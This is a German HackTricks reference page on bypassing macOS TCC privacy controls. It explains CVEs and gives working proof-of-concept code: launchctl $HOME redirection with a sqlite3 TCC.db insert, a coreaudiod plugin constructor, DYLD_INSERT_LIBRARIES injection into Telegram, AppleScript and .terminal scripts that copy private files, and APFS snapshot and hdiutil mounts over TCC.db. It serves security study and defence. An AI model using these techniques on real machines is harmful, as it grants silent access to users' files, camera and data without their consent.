# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## Nach Funktionalität

### Write Bypass

Dies ist kein Bypass, sondern einfach die Funktionsweise von TCC: **Es schützt nicht vor dem Schreiben**. Wenn Terminal **keinen Zugriff zum Lesen des Desktops eines Benutzers hat, kann es trotzdem in ihn schreiben**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
Das **erweiterte Attribut `com.apple.macl`** wird der neuen **Datei** hinzugefügt, um der **creators app** Zugriff zum Lesen zu gewähren.

### TCC ClickJacking

Es ist möglich, **ein Fenster über den TCC-Dialog zu legen**, damit der Benutzer ihn **unbemerkt akzeptiert**. Einen PoC findest du unter [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Ein Angreifer kann **Apps mit beliebigen Namen** (z. B. Finder, Google Chrome ...) in der **`Info.plist`** erstellen und sie dazu bringen, Zugriff auf einen durch TCC geschützten Ort anzufordern. Der Benutzer wird denken, dass die legitime Anwendung diesen Zugriff anfordert.\
Außerdem ist es möglich, die legitime App **aus dem Dock zu entfernen und die gefälschte dort zu platzieren**, sodass beim Klicken des Benutzers auf die gefälschte App (die dasselbe Icon verwenden kann) diese die legitime App aufruft, TCC-Berechtigungen anfordert und eine Malware ausführt. Dadurch glaubt der Benutzer, dass die legitime App den Zugriff angefordert hat.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Weitere Informationen und einen PoC findest du unter:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Standardmäßig verfügte ein Zugriff über **SSH über "Full Disk Access"**. Um dies zu deaktivieren, muss SSH aufgelistet, aber deaktiviert sein (durch das Entfernen aus der Liste werden diese Berechtigungen nicht entfernt):

![TCC Request by arbitrary name - SSH Bypass: Standardmäßig verfügte ein Zugriff über SSH über "Full Disk Access". Um dies zu deaktivieren, muss SSH aufgelistet, aber deaktiviert sein (durch das Entfernen ...](<../../../../../images/image (1077).png>)

Hier findest du Beispiele dafür, wie einige **Malwares diesen Schutz umgehen konnten**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

> [!CAUTION]
> Beachte, dass du jetzt **Full Disk Access** benötigst, um SSH aktivieren zu können.

### Handle extensions - CVE-2022-26767

Das Attribut **`com.apple.macl`** wird Dateien zugewiesen, um **einer bestimmten Anwendung Berechtigungen zum Lesen zu gewähren.** Dieses Attribut wird gesetzt, wenn eine Datei per **drag\&drop** auf eine App gezogen wird oder wenn ein Benutzer auf eine Datei **doppelklickt**, um sie mit der **Standardanwendung** zu öffnen.

Daher könnte ein Benutzer eine **bösartige App registrieren**, die alle Erweiterungen verarbeitet, und Launch Services aufrufen, um jede Datei zu **öffnen** (wodurch der bösartigen Datei Zugriff zum Lesen gewährt wird).

### iCloud

Mit dem Entitlement **`com.apple.private.icloud-account-access`** ist es möglich, mit dem **`com.apple.iCloudHelper`**-XPC-Service zu kommunizieren, der **iCloud-Tokens bereitstellt**.

**iMovie** und **Garageband** verfügten über dieses und weitere Entitlements, die dies ermöglichten.

Weitere **Informationen** über den Exploit zum **Abrufen von iCloud-Tokens** über dieses Entitlement findest du im Vortrag: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

Eine App mit der Berechtigung **`kTCCServiceAppleEvents`** kann **andere Apps steuern**. Das bedeutet, dass sie möglicherweise die **den anderen Apps gewährten Berechtigungen missbrauchen** kann.

Weitere Informationen zu Apple Scripts findest du unter:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Wenn eine App beispielsweise über eine **Automation-Berechtigung für `iTerm`** verfügt, kann in diesem Beispiel **`Terminal`** auf iTerm zugreifen:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

Terminal, das über keinen FDA verfügt, kann iTerm aufrufen, das über FDA verfügt, und es zur Ausführung von Aktionen verwenden:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Über Finder

Oder wenn eine App über Finder Zugriff hat, könnte sie ein Skript wie dieses ausführen:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Nach App-Verhalten

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Der **tccd daemon** im Userland verwendete die **`HOME`**-**env**-Variable, um auf die TCC-Benutzerdatenbank unter folgendem Pfad zuzugreifen: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Laut [diesem Stack Exchange-Beitrag](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) und da der TCC daemon über **`launchd`** innerhalb der Domain des aktuellen Benutzers ausgeführt wird, ist es möglich, **alle an ihn übergebenen Umgebungsvariablen zu kontrollieren**.\
Daher könnte ein **Angreifer die Umgebungsvariable `$HOME`** in **`launchctl`** so setzen, dass sie auf ein **kontrolliertes** **Verzeichnis** zeigt, den **TCC** daemon neu starten und anschließend die **TCC-Datenbank direkt ändern**, um sich selbst **jede verfügbare TCC-Berechtigung** zu gewähren, ohne dem Endbenutzer jemals eine Abfrage anzuzeigen.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Hinweise

Notes hatte Zugriff auf durch TCC geschützte Speicherorte. Wenn jedoch eine Notiz erstellt wird, wird diese **an einem nicht geschützten Speicherort erstellt**. Daher konnte man Notes anweisen, eine geschützte Datei in eine Notiz zu kopieren (also an einen nicht geschützten Speicherort), und anschließend auf die Datei zugreifen:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Die Binary `/usr/libexec/lsd` mit der Library `libsecurity_translocate` besaß das Entitlement `com.apple.private.nullfs_allow`, wodurch sie **nullfs**-Mounts erstellen konnte, sowie das Entitlement `com.apple.private.tcc.allow` mit **`kTCCServiceSystemPolicyAllFiles`**, um auf jede Datei zuzugreifen.

Es war möglich, das Quarantine-Attribut zu "Library" hinzuzufügen, den **`com.apple.security.translocation`**-XPC-Service aufzurufen, woraufhin Library nach **`$TMPDIR/AppTranslocation/d/d/Library`** gemappt wurde, wo auf alle Dokumente innerhalb von Library **zugegriffen** werden konnte.

### CVE-2023-38571 - Music & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`** verfügt über ein interessantes Feature: Wenn die Anwendung läuft, **importiert** sie die Dateien, die nach **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** kopiert werden, in die "Medienbibliothek" des Benutzers. Außerdem ruft sie etwas wie **`rename(a, b);`** auf, wobei `a` und `b` Folgendes sind:

- `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
- `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3"`

Dieses Verhalten von **`rename(a, b);`** ist für eine **Race Condition** anfällig, da es möglich ist, eine gefälschte **TCC.db**-Datei im Ordner `Automatically Add to Music.localized` abzulegen und dann, sobald der neue Ordner (b) erstellt wurde, die Datei zu kopieren, zu löschen und auf **`~/Library/Application Support/com.apple.TCC`**/ zu verweisen.
**Weitere Informationen** [**im writeup**](https://gergelykalman.com/CVE-2023-38571-a-macOS-TCC-bypass-in-Music-and-TV.html)


### SQLITE_SQLLOG_DIR - CVE-2023-32422

Wenn **`SQLITE_SQLLOG_DIR="path/folder"`** gesetzt ist, bedeutet dies grundsätzlich, dass **jede geöffnete Datenbank in diesen Pfad kopiert wird**. In diesem CVE wurde diese Funktion missbraucht, um in eine **SQLite-Datenbank** zu **schreiben**, die von einem Prozess mit FDA geöffnet werden sollte: die TCC-Datenbank. Anschließend wurde **`SQLITE_SQLLOG_DIR`** mit einem **Symlink im Dateinamen** missbraucht, sodass beim **Öffnen** dieser Datenbank die Datei **TCC.db des Benutzers mit der geöffneten Datenbank überschrieben** wurde.\
**Weitere Informationen** [**im writeup**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **und**[ **im talk**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y&t=20548s).

### **SQLITE_AUTO_TRACE**

Wenn die Umgebungsvariable **`SQLITE_AUTO_TRACE`** gesetzt ist, beginnt die Library **`libsqlite3.dylib`**, alle SQL-Abfragen zu **loggen**. Viele Anwendungen verwendeten diese Library, daher war es möglich, alle ihre SQLite-Abfragen zu loggen.

Mehrere Apple-Anwendungen verwendeten diese Library, um auf durch TCC geschützte Informationen zuzugreifen.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407

Diese **env variable wird vom `Metal` framework verwendet**, das eine Abhängigkeit verschiedener Programme ist, insbesondere von `Music`, das über FDA verfügt.

Beim Setzen von: `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`. Wenn `path` ein gültiges Verzeichnis ist, wird der Bug ausgelöst und wir können `fs_usage` verwenden, um zu sehen, was im Programm passiert:

- eine Datei wird mit `open()` geöffnet, genannt `path/.dat.nosyncXXXX.XXXXXX` (X ist zufällig)
- ein oder mehrere `write()` schreiben den Inhalt in die Datei (wir kontrollieren diesen nicht)
- `path/.dat.nosyncXXXX.XXXXXX` wird in `path/name` `renamed()`

Es handelt sich um einen temporären Dateischreibvorgang, gefolgt von einem **`rename(old, new)`**, **der nicht sicher ist.**

Er ist nicht sicher, weil die alten und neuen Pfade **separat aufgelöst werden müssen**, was einige Zeit dauern kann und anfällig für eine Race Condition sein kann. Weitere Informationen findest du in der `xnu`-Funktion `renameat_internal()`.

> [!CAUTION]
> Wenn also ein privilegierter Prozess aus einem von dir kontrollierten Ordner umbenennt, könntest du eine RCE erlangen und dafür sorgen, dass er auf eine andere Datei zugreift oder, wie bei dieser CVE, die vom privilegierten Programm erstellte Datei öffnet und einen FD speichert.
>
> Wenn der Rename-Vorgang auf einen von dir kontrollierten Ordner zugreift, während du die Quelldatei verändert hast oder einen FD darauf besitzt, änderst du die Zieldatei (oder den Zielordner), sodass sie auf einen Symlink zeigt. Dadurch kannst du schreiben, wann immer du möchtest.

Dies war der Angriff bei der CVE: Um beispielsweise die `TCC.db` des Benutzers zu überschreiben, können wir:

- `/Users/hacker/ourlink` erstellen, sodass es auf `/Users/hacker/Library/Application Support/com.apple.TCC/` zeigt
- das Verzeichnis `/Users/hacker/tmp/` erstellen
- `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db` setzen
- den Bug auslösen, indem `Music` mit dieser env variable ausgeführt wird
- das `open()` von `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` abfangen (X ist zufällig)
- hier öffnen wir diese Datei ebenfalls zum Schreiben und behalten den file descriptor
- `/Users/hacker/tmp` und `/Users/hacker/ourlink` **in einer Schleife atomar austauschen**
- dies tun wir, um unsere Erfolgschancen zu maximieren, da das Race Window ziemlich klein ist, ein verlorenes Race jedoch kaum Nachteile hat
- kurz warten
- testen, ob wir Glück hatten
- falls nicht, wieder von oben beginnen

Weitere Informationen unter [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

> [!CAUTION]
> Wenn du jetzt versuchst, die env variable `MTL_DUMP_PIPELINES_TO_JSON_FILE` zu verwenden, werden Apps nicht gestartet.

### Apple Remote Desktop

Als root könntest du diesen Service aktivieren. Der **ARD agent hätte dann full disk access**, was anschließend von einem Benutzer missbraucht werden könnte, um eine neue **TCC user database** zu kopieren.

## By **NFSHomeDirectory**

TCC verwendet eine Datenbank im HOME-Ordner des Benutzers, um den Zugriff auf benutzerspezifische Ressourcen unter **$HOME/Library/Application Support/com.apple.TCC/TCC.db** zu kontrollieren.\
Wenn es dem Benutzer daher gelingt, TCC mit einer `$HOME` env variable neu zu starten, die auf ein **anderes Verzeichnis** zeigt, könnte er eine neue TCC-Datenbank unter **/Library/Application Support/com.apple.TCC/TCC.db** erstellen und TCC dazu bringen, jeder App jede TCC-Berechtigung zu gewähren.

> [!TIP]
> Beachte, dass Apple die in dem Benutzerprofil gespeicherte Einstellung im Attribut **`NFSHomeDirectory`** als **Wert von `$HOME`** verwendet. Wenn du also eine Anwendung mit Berechtigungen zum Ändern dieses Werts (**`kTCCServiceSystemPolicySysAdminFiles`**) kompromittierst, kannst du diese Option mit einem TCC bypass **weaponizen**.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

Der **erste POC** verwendet [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) und [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/), um den **HOME**-Ordner des Benutzers zu ändern.

1. Einen _csreq_-Blob für die Ziel-App abrufen.
2. Eine gefälschte _TCC.db_-Datei mit den erforderlichen Zugriffsrechten und dem _csreq_-Blob platzieren.
3. Den Directory-Services-Eintrag des Benutzers mit [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) exportieren.
4. Den Directory-Services-Eintrag ändern, um das Home-Verzeichnis des Benutzers zu ändern.
5. Den geänderten Directory-Services-Eintrag mit [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) importieren.
6. Den _tccd_ des Benutzers stoppen und den Prozess neu starten.

Der zweite POC verwendete **`/usr/libexec/configd`**, das über `com.apple.private.tcc.allow` mit dem Wert `kTCCServiceSystemPolicySysAdminFiles` verfügte.\
Es war möglich, **`configd`** mit der Option **`-t`** auszuführen, wodurch ein Angreifer ein **benutzerdefiniertes Bundle zum Laden** angeben konnte. Daher ersetzt der Exploit die Methode zum Ändern des Home-Verzeichnisses des Benutzers mittels **`dsexport`** und **`dsimport`** durch eine **`configd`-Code-Injection**.

Weitere Informationen findest du im [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## By process injection

Es gibt verschiedene Techniken, um Code in einen Prozess zu injizieren und dessen TCC-Rechte zu missbrauchen:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Darüber hinaus erfolgt die häufigste gefundene process injection zum Umgehen von TCC über **Plugins (load library)**.\
Plugins sind zusätzlicher Code, üblicherweise in Form von Libraries oder plist-Dateien, der **von der Hauptanwendung geladen wird** und in deren Kontext ausgeführt wird. Wenn die Hauptanwendung Zugriff auf durch TCC eingeschränkte Dateien hatte (über gewährte Berechtigungen oder Entitlements), verfügt **auch der benutzerdefinierte Code darüber**.

### CVE-2020-27937 - Directory Utility

Die Anwendung `/System/Library/CoreServices/Applications/Directory Utility.app` verfügte über das Entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, lud Plugins mit der Erweiterung **`.daplug`** und verfügte **nicht über die hardened** runtime.

Um diese CVE zu weaponizen, wird **`NFSHomeDirectory`** **geändert** (unter Missbrauch des vorherigen Entitlements), um die **TCC-Datenbank des Benutzers übernehmen** und TCC umgehen zu können.

Weitere Informationen findest du im [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).

### CVE-2020-29621 - Coreaudiod

Das Binary **`/usr/sbin/coreaudiod`** verfügte über die Entitlements `com.apple.security.cs.disable-library-validation` und `com.apple.private.tcc.manager`. Das erste **ermöglichte Code-Injection**, während das zweite Zugriff auf die **Verwaltung von TCC** gewährte.

Dieses Binary erlaubte das Laden von **third party plug-ins** aus dem Ordner `/Library/Audio/Plug-Ins/HAL`. Daher war es möglich, mit diesem POC ein **Plugin zu laden und die TCC-Berechtigungen zu missbrauchen**:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Weitere Informationen finden Sie im [**Originalbericht**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Device Abstraction Layer (DAL) Plug-Ins

Systemanwendungen, die einen Kamerastream über Core Media I/O öffnen (Anwendungen mit **`kTCCServiceCamera`**), laden diese **Plug-ins** im Prozess, die sich unter `/Library/CoreMediaIO/Plug-Ins/DAL` befinden (nicht durch SIP geschützt).

Es reicht aus, dort eine Library mit dem üblichen **constructor** abzulegen, um **Code zu injizieren**.

Mehrere Apple-Anwendungen waren dafür anfällig.

### Firefox

Die Firefox-Anwendung verfügte über die Entitlements `com.apple.security.cs.disable-library-validation` und `com.apple.security.cs.allow-dyld-environment-variables`:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Weitere Informationen dazu, wie sich dies einfach ausnutzen lässt, findest du im [**original report**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

Die Binary `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` verfügte über die Entitlements **`com.apple.private.tcc.allow`** und **`com.apple.security.get-task-allow`**, wodurch Code in den Prozess injiziert und die TCC-Privilegien verwendet werden konnten.

### CVE-2023-26818 - Telegram

Telegram verfügte über die Entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** und **`com.apple.security.cs.disable-library-validation`**, sodass diese Anwendung missbraucht werden konnte, um **Zugriff auf ihre Berechtigungen zu erhalten**, beispielsweise für Aufnahmen mit der Kamera. Du kannst das Payload im [**writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/) finden.

Um mithilfe der Umgebungsvariable eine Library zu laden, wurde eine **benutzerdefinierte plist** erstellt, um diese Library zu injizieren, und **`launchctl`** wurde verwendet, um sie zu starten:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Durch open-Aufrufe

Es ist möglich, **`open`** auch innerhalb einer Sandbox aufzurufen.

### Terminal Scripts

Es ist ziemlich üblich, Terminal **Full Disk Access (FDA)** zu gewähren, zumindest auf Computern, die von technisch versierten Personen verwendet werden. Damit ist es möglich, **`.terminal`**-Skripte aufzurufen.

**`.terminal`**-Skripte sind plist-Dateien wie diese, wobei der auszuführende Befehl im Schlüssel **`CommandString`** steht:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Eine Anwendung könnte ein Terminal-Skript an einem Ort wie /tmp schreiben und es mit einem Befehl wie folgt starten:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Durch Mounten

### CVE-2020-9771 - mount_apfs TCC bypass und Privilege Escalation

**Jeder Benutzer** (auch nicht privilegierte Benutzer) kann einen Time-Machine-Snapshot erstellen und mounten und auf **ALLE Dateien** dieses Snapshots zugreifen.\
Die **einzige erforderliche Berechtigung** besteht darin, dass die verwendete Anwendung (z. B. `Terminal`) über **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`) verfügen muss, der von einem Administrator gewährt werden muss.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Eine ausführlichere Erklärung ist im [**Originalbericht zu finden**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Mount über TCC-Datei

Selbst wenn die TCC-Datenbankdatei geschützt war, war es möglich, eine neue TCC.db-Datei **über das Verzeichnis zu mounten**:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Überprüfe den **vollständigen Exploit** im [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/).

### CVE-2024-40855

Wie im [original writeup](https://www.kandji.io/blog/macos-audit-story-part2) erklärt, missbrauchte dieses CVE `diskarbitrationd`.

Die Funktion `DADiskMountWithArgumentsCommon` aus dem öffentlichen `DiskArbitration`-Framework führte die Sicherheitsprüfungen durch. Es ist jedoch möglich, diese zu umgehen, indem `diskarbitrationd` direkt aufgerufen wird und dadurch `../`-Elemente im Pfad sowie symlinks verwendet werden können.

Dies ermöglichte einem Angreifer beliebige Mounts an jedem Ort durchzuführen, einschließlich über der TCC-Datenbank, da `diskarbitrationd` über das Entitlement `com.apple.private.security.storage-exempt.heritable` verfügt.

### asr

Das Tool **`/usr/sbin/asr`** ermöglichte es, die gesamte Festplatte zu kopieren und sie an einem anderen Ort zu mounten, wodurch TCC-Schutzmechanismen umgangen wurden.

### Location Services

Es gibt eine dritte TCC-Datenbank in **`/var/db/locationd/clients.plist`**, die angibt, welchen Clients der **Zugriff auf Location Services** erlaubt ist.\
Der Ordner **`/var/db/locationd/` war nicht gegen das Mounten von DMGs geschützt**, sodass es möglich war, unsere eigene plist zu mounten.

## Über Startup-Apps


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Über grep

In mehreren Fällen speichern Dateien sensible Informationen wie E-Mail-Adressen, Telefonnummern, Nachrichten usw. an nicht geschützten Orten (was bei Apple als Sicherheitslücke gilt).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Dies funktioniert inzwischen nicht mehr, aber es [**funktionierte früher**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Eine weitere Möglichkeit unter Verwendung von [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Referenzen

- [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

{{#include ../../../../../banners/hacktricks-training.md}}
